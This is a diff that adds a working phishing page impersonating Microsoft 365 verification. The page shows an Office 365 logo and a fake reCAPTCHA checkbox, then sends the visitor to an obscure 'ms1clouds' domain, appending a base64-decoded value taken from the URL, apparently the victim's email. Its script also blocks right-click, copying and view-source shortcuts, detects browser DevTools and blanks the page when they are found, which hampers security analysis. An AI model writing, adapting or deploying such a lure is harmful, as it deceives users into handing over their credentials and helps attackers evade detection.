@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft 365 Verification</title>
+  <style>
+    body {
+      background-color: #dbeaf4;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 350px;
+      margin: 60px auto;
+      padding: 30px;
+      background-color: white;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0px 6px 15px rgba(0,0,0,0.15);
+    }
+    .logo {
+      width: 250px;
+      margin-bottom: 25px;
+    }
+    h2 {
+      margin: 10px 0;
+      font-weight: bold;
+    }
+    .desc {
+      margin-bottom: 30px;
+      color: #444;
+    }
+    .fake-recaptcha {
+      display: inline-block;
+      width: 302px;
+      height: 76px;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
+      position: relative;
+      cursor: pointer;
+      margin-bottom: 20px;
+      user-select: none;
+    }
+    .fake-checkbox {
+      position: absolute;
+      top: 26px;
+      left: 50px;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #c1c1c1;
+      background-color: #fff;
+    }
+    .fake-checkbox.checked {
+      background-color: #3c8dbc;
+      border-color: #3c8dbc;
+    }
+    .fake-checkbox.checked::after {
+      content: '';
+      position: absolute;
+      left: 4px;
+      top: 0px;
+      width: 5px;
+      height: 10px;
+      border: solid white;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+    .recaptcha-label {
+      position: absolute;
+      top: 24px;
+      left: 80px;
+      font-size: 14px;
+      color: #555;
+    }
+    .recaptcha-logo {
+      position: absolute;
+      right: 10px;
+      bottom: 10px;
+      width: 60px;
+      opacity: 0.6;
+    }
+    button {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      opacity: 1;
+      display: none;
+      position: relative;
+    }
+    .spinner {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      width: 16px;
+      height: 16px;
+      margin-top: -8px;
+      border: 2px solid #fff;
+      border-top: 2px solid #0078d4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+    button.loading .spinner {
+      display: inline-block;
+    }
+    .fake-recaptcha.loading .spinner {
+      display: block;
+    }
+    .fake-recaptcha.loading .fake-checkbox,
+    .fake-recaptcha.loading .recaptcha-label {
+      opacity: 0.5;
+      pointer-events: none;
+    }
+    .fake-recaptcha .spinner {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 24px;
+      height: 24px;
+      margin: -12px 0 0 -12px;
+      border: 3px solid #ccc;
+      border-top: 3px solid #888;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    /* overlay used when DevTools detected (keeps visual behavior intact until detection) */
+    .__deterrent-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.98);
+      z-index: 999999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      color: #333;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      text-align: center;
+      padding: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+  </style>
+</head>
+<body>
+<div id="deterrent-overlay"></div>
+  <div class="container">
+    <img class="logo" src="data:image/png;base64,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" alt="Office 365"/>
+    <p class="desc">Complete the security check below to proceed.</p>
+    
+    <div class="fake-recaptcha" onclick="simulateCaptcha()">
+      <div id="checkbox" class="fake-checkbox"></div>
+      <span class="recaptcha-label">I'm not a robot</span>
+      <div class="spinner"></div>
+      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="recaptcha-logo" alt="reCAPTCHA">
+    </div>
+
+    <br>
+    <button id="submitBtn">
+      <span class="text">Submit to Continue</span>
+      <div class="spinner"></div>
+    </button>
+  </div>
+
+<script>
+const fakeRecaptcha = document.querySelector(".fake-recaptcha");
+const checkbox = document.getElementById("checkbox");
+const btn = document.getElementById("submitBtn");
+const targetUrl = "https://ms1clouds.flarekyjopmcbsojwezpyomboywc.delaiedgoruptx.space/f/zx0IaWxiAHk-FgKgbSb9";
+let isLoading = false, isChecked = false;
+
+function simulateCaptcha() {
+  if (isLoading || isChecked) return;
+  isLoading = true;
+  fakeRecaptcha.classList.add("loading");
+  setTimeout(() => {
+    fakeRecaptcha.classList.remove("loading");
+    checkbox.classList.add("checked");
+    btn.style.display = "inline-block";
+    isChecked = true;
+    isLoading = false;
+  }, 1000);
+}
+
+function cleanFragment(fragment){
+  if(!fragment) return "";
+  fragment = fragment.replace(/#+$/, ''); // strip trailing #
+  const eqIndex = fragment.indexOf('=');
+  if(eqIndex!==-1) fragment = fragment.substring(eqIndex+1);
+  if(/^[A-Za-z0-9]+$/.test(fragment)) return "";
+  try { return atob(fragment); } catch(e){ return decodeURIComponent(fragment); }
+}
+
+btn.addEventListener("click", () => {
+  if(!isChecked) return;
+  btn.disabled = true;
+  btn.classList.add("loading");
+  setTimeout(()=>{
+    const url = window.location.href;
+    const dollarIndex = url.indexOf('$');
+    let cleanedFragment = "";
+    if(dollarIndex!==-1){
+      const rawFragment = url.substring(dollarIndex+1);
+      cleanedFragment = cleanFragment(rawFragment);
+    }
+    let redirectUrl = targetUrl + (cleanedFragment ? ('$'+cleanedFragment) : '');
+    window.location.href = redirectUrl;
+  },1500);
+});
+
+/* Deterrent measures */
+(function(){
+  // Disable context menu & selection
+  document.addEventListener('contextmenu', e=>e.preventDefault());
+  document.addEventListener('selectstart', e=>e.preventDefault());
+  document.addEventListener('copy', e=>e.preventDefault());
+
+  // Block common keys
+  document.addEventListener('keydown', function(e){
+    if(e.key==='F12' || (e.ctrlKey && ['s','S','u','U','Shift'].includes(e.key))) e.preventDefault();
+  });
+
+  // DevTools detection (simple heuristic)
+  let overlay = document.getElementById('deterrent-overlay');
+  let lastWidth = window.outerWidth - window.innerWidth;
+  let lastHeight = window.outerHeight - window.innerHeight;
+
+  setInterval(()=>{
+    let wDiff = window.outerWidth - window.innerWidth;
+    let hDiff = window.outerHeight - window.innerHeight;
+    if(Math.abs(wDiff-lastWidth)>100 || Math.abs(hDiff-lastHeight)>100){
+      overlay.style.display='block';
+      setTimeout(()=>window.location.href='about:blank',500);
+    }
+  },1000);
+
+  // Fallback detection by devtools open (console)
+  setInterval(()=>{
+    const start = new Date();
+    debugger;
+    if(new Date()-start>100){
+      overlay.style.display='block';
+      setTimeout(()=>window.location.href='about:blank',500);
+    }
+  },2000);
+})();
+</script>
+</body>
+</html>
